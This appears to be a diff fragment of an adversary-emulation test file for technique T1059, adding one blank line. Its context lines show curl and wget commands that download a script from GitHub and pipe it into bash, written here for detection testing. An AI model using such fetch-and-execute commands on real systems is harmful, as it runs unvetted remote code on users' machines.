@@ -22,6 +22,7 @@ atomic_tests:
     command: |
       bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
       bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
+
 - name: Command-Line Interface(cmd.exe)
   uuid: 5a6426b7-b159-425b-8d9f-2866acfb64a4
 
